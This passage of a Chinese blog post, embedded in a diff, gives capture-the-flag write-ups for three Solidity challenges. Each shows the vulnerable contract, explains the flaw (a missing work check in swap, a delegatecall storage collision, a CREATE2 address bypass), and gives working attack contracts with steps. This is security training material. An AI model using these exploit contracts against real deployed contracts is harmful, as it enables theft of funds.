class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解题分析<br>看完合约就能够发：现解题方法一定在stake,unstake和swap里面。最开始我一直在思考workBalance的溢出问题，然后放弃了，之后我发现stake中影响workbalance的只有blockNumber而和amount没有关系，unstake可直接将passed修改为true并不会重置，并且swap处并没有检查是否完成工作，所以可以直接提取。<br>解题步骤：<br>1.部署合约</p>
+<p>2.根据合约地址得到三个合约</p>
+<p>3.调用stake函数，输入0和1区块，目的是为了调用unstake函数（但后面我发现可以直接调用）</p>
+<p>4.调用unstake函数，将passed修改为true，从而能够顺利取到workbalance</p>
+<p>5.再次调用stake函数，区块数输入500000</p>
+<p>6.查看workBalance余额</p>
+<p>7.执行swap函数，将workBalance转换为balance</p>
+<p>8.查看我们ZT的余额</p>
+<p>9.满足completed条件，直接调用，isSolved变为true</p>
+<p>10.提交题目，拿到旗帜！</p>
+<p>2.nc 1.15.39.10 10004<br>源码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Defuse</span>&#123;</span><br><span class="line">    bool public <span class="title class_">Explode</span> = <span class="literal">false</span>;</span><br><span class="line">    address public launcherAddress;</span><br><span class="line">    bytes32 private password;</span><br><span class="line">    bool public powerState = <span class="literal">true</span>;</span><br><span class="line">    bytes4 constant launcher_start_function_hash = <span class="title function_">bytes4</span>(<span class="title function_">keccak256</span>(<span class="string">&quot;changedeadline(uint256)&quot;</span>));</span><br><span class="line">    <span class="title class_">Launcher</span> launcher;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">checkPassword</span>(<span class="params"></span>) public returns (bytes32 result)  &#123;</span><br><span class="line">        bytes memory msgdata = msg.<span class="property">data</span>;</span><br><span class="line">        <span class="keyword">if</span> (msgdata.<span class="property">length</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0x0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            result := <span class="title function_">mload</span>(<span class="title function_">add</span>(msgdata, <span class="title function_">add</span>(<span class="number">0x20</span>, <span class="number">0x24</span>)))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">onlyOwner</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">checkPassword</span>() == password);</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> != tx.<span class="property">origin</span>);</span><br><span class="line">        uint x;</span><br><span class="line">        assembly &#123; x := <span class="title function_">extcodesize</span>(caller) &#125;</span><br><span class="line">        <span class="built_in">require</span>(x == <span class="number">0</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">notExplode</span>(<span class="params"></span>)&#123;</span><br><span class="line">        launcher = <span class="title class_">Launcher</span>(launcherAddress);</span><br><span class="line">        <span class="built_in">require</span>(block.<span class="property">number</span> &lt; launcher.<span class="title function_">deadline</span>());</span><br><span class="line">        <span class="title class_">Explode</span> = <span class="literal">true</span>;</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _launcherAddress, bytes32 _fakeflag</span>) public &#123;</span><br><span class="line">        launcherAddress = _launcherAddress;</span><br><span class="line">        password = _fakeflag ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setCountDownTimer</span>(<span class="params">uint256 _deadline</span>) public onlyOwner notExplode &#123;</span><br><span class="line">        launcherAddress.<span class="title function_">delegatecall</span>(abi.<span class="title function_">encodeWithSignature</span>(<span class="string">&quot;changedeadline(uint256)&quot;</span>,_deadline));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Setup</span> &#123;</span><br><span class="line">    <span class="title class_">Defuse</span> public defuse;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">bytes32 _password</span>) public &#123;</span><br><span class="line">        defuse = <span class="keyword">new</span> <span class="title class_">Defuse</span>(<span class="title function_">address</span>(<span class="keyword">new</span> <span class="title class_">Launcher</span>()), _password);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isSolved</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> defuse.<span class="title function_">powerState</span>() == <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract <span class="title class_">Launcher</span>&#123;</span><br><span class="line">    uint256 public deadline;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">changedeadline</span>(<span class="params">uint256 _deadline</span>) public &#123;</span><br><span class="line">        deadline = _deadline;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        deadline = block.<span class="property">number</span> + <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解题分析：分析合约后发现合约中并没有能够直接修改目标状态变量的语句，但delegatecall吸引了我的注意力，这个函数能利用的地方太多了。要执行delegatecall就需要执行setCountDownTimer,则需要满足onlyOwner和notExplope.</p>
+<p>onlyOwner第一个条件涉及到checkPassword，需要我输对密码，<br>也就是说我的data从第六十八个字节开始需要是密码。第二个条件意味着我需要编写合约进行攻击，第三个条件需要我的攻击合约地址为零，因此把攻击代码放入构造函数进行攻击。</p>
+<p>观察notExplode我发现，他居然直接修改了他的launcher地址，这就意味着我可以随意编写自己的launcher，对他进行攻击。它需要我们在100个区块之内进行执行，否则无法通过。</p>
+<p>查看Launcher的changedeadline函数，我发现deadline在storage(0)。</p>
+<p>而Defuse的storage(0)中包含Explode和laucherAddress，因此我们可以通过调用changedeadline来修改laucherAddress,再进行第二次调用则会通过notExplode来将laucher修改为我自己的攻击合约。<br>分析完成进行攻击。<br>攻击合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    <span class="title class_">Defuse</span> defuse;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _addr</span>)public&#123;</span><br><span class="line">        defuse = <span class="title class_">Defuse</span>(_addr);</span><br><span class="line">        <span class="title function_">address</span>(defuse).<span class="title function_">call</span>(abi.<span class="title function_">encodeWithSignature</span>(<span class="string">&quot;setCountDownTimer(uint256)&quot;</span>,</span><br><span class="line">         <span class="number">0x000000000000000000000037Af4cff1932659DDaD9Cc00e1235F09C03c766900</span>, </span><br><span class="line">         <span class="number">0x50ff0f52db8fd58abf094db7ef8e56acd1e5250dcb9dbd6e5a5b3f2b67d00e3a</span>));</span><br><span class="line">         <span class="title function_">address</span>(defuse).<span class="title function_">call</span>(abi.<span class="title function_">encodeWithSignature</span>(<span class="string">&quot;setCountDownTimer(uint256)&quot;</span>,</span><br><span class="line">         <span class="number">0x000000000000000000000037Af4cff1932659DDaD9Cc00e1235F09C03c766900</span>, </span><br><span class="line">         <span class="number">0x50ff0f52db8fd58abf094db7ef8e56acd1e5250dcb9dbd6e5a5b3f2b67d00e3a</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract attackLauncher&#123;</span><br><span class="line">    bool public <span class="title class_">Explode</span> = <span class="literal">false</span>;</span><br><span class="line">    address public launcherAddress;</span><br><span class="line">    bytes32 private password;</span><br><span class="line">    uint256 public deadline ;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        deadline = block.<span class="property">number</span>+<span class="number">100000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">changedeadline</span>(<span class="params">uint256 _deadline</span>) public &#123;</span><br><span class="line">        deadline = <span class="number">0x0000000000000000000000000000000000000000000000000000000000000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击步骤：<br>1.部署合约：</p>
+<p>2.部署attackLaucher</p>
+<p>3.得到密码，由于密码是private的，我们通过JS的方式拿到密码</p>
+<p>4.查看他的storage(0)格式</p>
+<p>5.知道格式和密码后构造我们的data</p>
+<p>6.构造完成后直接攻击，将defuse代码放入参数。</p>
+<p>7.攻击成功</p>
+<p>8.powerState成功改变</p>
+<p>9.调用isSolved,目标完成</p>
+<p>10.提交题目，拿到旗帜！</p>
+<p>3.nc 1.15.39.10 10008<br>源码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.12</span>;</span><br><span class="line">contract betToken&#123;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span>=&gt;</span>uint)public balance;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>)public&#123;</span><br><span class="line">         balance[msg.<span class="property">sender</span>] += <span class="number">10000000</span> *<span class="number">10</span> **<span class="number">18</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address account</span>)public view <span class="title function_">returns</span>(<span class="params">uint</span>)&#123;</span><br><span class="line">         <span class="keyword">return</span> balance[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address to,uint amount</span>)external&#123;</span><br><span class="line">        <span class="title function_">_transfer</span>(msg.<span class="property">sender</span>,to,amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_transfer</span>(<span class="params">address <span class="keyword">from</span>,address to,uint amount</span>)internal&#123;</span><br><span class="line">        <span class="built_in">require</span>(balance[<span class="keyword">from</span>] &gt;= amount,<span class="string">&quot;amount exceed&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(to != <span class="title function_">address</span>(<span class="number">0</span>),<span class="string">&quot;you cant burn my token&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(balance[to]+amount &gt;= balance[to]);</span><br><span class="line">        balance[<span class="keyword">from</span>] -= amount;</span><br><span class="line">        balance[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract betGame&#123;</span><br><span class="line">    <span class="comment">//only my family can use the whole contract</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// i will check your appearance to check if you are my family</span></span><br><span class="line">    betToken public token;</span><br><span class="line"></span><br><span class="line">    bytes20 internal appearance = <span class="title function_">bytes20</span>(<span class="title function_">bytes32</span>(<span class="string">&quot;ZT&quot;</span>))&gt;&gt;<span class="number">144</span>;</span><br><span class="line">    bytes20 internal maskcode = <span class="title function_">bytes20</span>(<span class="title function_">uint160</span>(<span class="number">0xffff</span>));</span><br><span class="line"></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span>=&gt;</span>bool)public status;</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">SendFlag</span>(address addr);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        token = <span class="keyword">new</span> <span class="title function_">betToken</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier only_family&#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">is_my_family</span>(msg.<span class="property">sender</span>),</span><br><span class="line">        <span class="string">&quot;no no no,my family only&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier only_EOA&#123;</span><br><span class="line">        uint x;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := <span class="title function_">extcodesize</span>(<span class="title function_">caller</span>())</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="built_in">require</span>(x == <span class="number">0</span>,<span class="string">&quot;Only EOA can do that&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">is_my_family</span>(<span class="params">address account</span>) internal returns (bool) &#123;</span><br><span class="line">        bytes20 you = <span class="title function_">bytes20</span>(account);</span><br><span class="line"></span><br><span class="line">        bytes20 code = maskcode;</span><br><span class="line">        bytes20 feature = appearance;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; <span class="number">34</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (you &amp; code == feature) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            code &lt;&lt;= <span class="number">4</span>;</span><br><span class="line">            feature &lt;&lt;= <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">share_my_vault</span>(<span class="params"></span>)external only_EOA only_family&#123;</span><br><span class="line">        token.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>,token.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">function</span> <span class="title function_">payforflag</span>(<span class="params"></span>) public&#123;</span><br><span class="line">        <span class="built_in">require</span>(token.<span class="title function_">balance</span>(msg.<span class="property">sender</span>) &gt;= <span class="number">10000000</span> *<span class="number">10</span> **<span class="number">18</span>, <span class="string">&quot;Try again&quot;</span>);</span><br><span class="line">        emit <span class="title class_">SendFlag</span>(msg.<span class="property">sender</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解题分析：<br>通过计算我得到appearance为0x0000000000000000000000000000000000005a5e<br>maskcode为0x000000000000000000000000000000000000ffff;<br>首先我们看到能够发送事件SendFlag的只有函数payforflag，而要调用这个函数需要我们的余额大于10000000<em>10</em>18,也就是该合约的余额，所以我们要调用share_my_vault函数，就需要满足两个修饰符。<br>only_EOA与上题一样，需要我们提供构造函数进行攻击。重点在only_family,而only_family又需要我们使is_my_family函数返回true，也就是本题的重点。</p>
+<p>这个函数需要我们使you跟code进行与运算，结果要等于feature。每次for循环都会使code和feature的二进制值左移四位，也就是在十六进制中左移一位，而由于code和feature初始值都只有后四位有值，且在for循环中移位也是同步的，feature为ffff，也就意味着我们的you中需要包含code的四个数字值，跟code做与运算后就会得到feature本身。</p>
+<p>但you是什么呢，起初我以为可以自己进行构造，但很快我发现我天真了，you是msg.sender，也就是我合约的地址，而合约地址一般是不可控的，所以我使用了creat2操作来得到我满足条件的合约地址。<br>攻击合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ccontract attack&#123;</span><br><span class="line">    address bet =<span class="number">0xE3DfE1cdFf8F4F37a527fdaB43C1E9FD98384E0d</span>;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        bet.<span class="title function_">call</span>(abi.<span class="title function_">encodeWithSignature</span>(<span class="string">&quot;share_my_vault()&quot;</span>));</span><br><span class="line">        bet.<span class="title function_">call</span>(abi.<span class="title function_">encodeWithSignature</span>(<span class="string">&quot;payforflag()&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">complete</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        bet.<span class="title function_">call</span>(abi.<span class="title function_">encodeWithSignature</span>(<span class="string">&quot;payforflag()&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract <span class="title class_">DeployAttack</span> &#123;</span><br><span class="line">  bytes attackCode = hex<span class="string">&quot;60806040527319732f5257cb68b8f54fe8cd3a7120a39b7a6a106000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561006457600080fd5b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527fa3442ead000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b60208310610152578051825260208201915060208101905060208303925061012f565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d80600081146101b4576040519150601f19603f3d011682016040523d82523d6000602084013e6101b9565b606091505b50505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527f3cdb3d5d000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b602083106102a95780518252602082019150602081019050602083039250610286565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d806000811461030b576040519150601f19603f3d011682016040523d82523d6000602084013e610310565b606091505b5050506101c9806103226000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063522e117714610030575b600080fd5b61003861003a565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527f3cdb3d5d000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b602083106101275780518252602082019150602081019050602083039250610104565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114610189576040519150601f19603f3d011682016040523d82523d6000602084013e61018e565b606091505b50505056fea2646970667358221220f8461c6396c166298d447dc6f4443fe1ecc58973f8ac95c26af36310a94099bd64736f6c634300060c0033&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">deploy</span>(<span class="params">bytes32 salt</span>) public &#123;</span><br><span class="line">    bytes memory bytecode = attackCode;</span><br><span class="line">    address addr;</span><br><span class="line">      </span><br><span class="line">    assembly &#123;</span><br><span class="line">      addr := <span class="title function_">create2</span>(<span class="number">0</span>, <span class="title function_">add</span>(bytecode, <span class="number">0x20</span>), <span class="title function_">mload</span>(bytecode), salt)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">getHash</span>(<span class="params"></span>)public view <span class="title function_">returns</span>(<span class="params">bytes32</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">keccak256</span>(attackCode);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>攻击步骤：<br>1.部署合约</p>
+<p>2.将目标合约地址放入attck合约，编译attack合约并获取attack合约字节码</p>
+<p>3.将字节码放入DeployAttack合约,并部署</p>
+<p>4.执行getHash函数得到attack字节码的哈希值</p>
+<p>5.将DeployAttack函数的地址和字节码哈希值放入脚本代码</p>
+<p>6.执行脚本代码，计算出salt和生成的地址</p>
+<p>7.将生成的salt值放入deploy函数中执行（由于会部署合约，需要消耗较多的gas，需在小狐狸处手动设置gas）.</p>
+<p>8.查看我们的攻击合约的余额，余额增加，攻击应该成功了</p>
+<p>9.提交旗帜发现需要交易的哈希值，区块链浏览器上查看</p>
+<p>10.夺旗，成功</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>lucifer
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2022/12/01/solidity%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%BA%8C%EF%BC%89/" title="solidity漏洞实践（二）">http://example.com/2022/12/01/solidity漏洞实践（二）/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/12/01/DdmnVulnerableDeFi%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98-11-13/" rel="prev" title="DdmnVulnerableDeFi靶场实战(11-13)">
+      <i class="fa fa-chevron-left"></i> DdmnVulnerableDeFi靶场实战(11-13)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/12/01/2022%E4%B8%AD%E5%9B%BD%E5%8F%AF%E4%BF%A1%E5%8C%BA%E5%9D%97%E9%93%BE%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B%E8%B5%9B%E9%A2%98%E5%85%A8%E8%A7%A3/" rel="next" title="2022中国可信区块链大赛初赛赛题全解">
+      2022中国可信区块链大赛初赛赛题全解 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">lucifer</p>
+  <div class="site-description" itemprop="description">我的老婆严菡是猪</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022-12 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lucifer</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">190k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">2:53</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
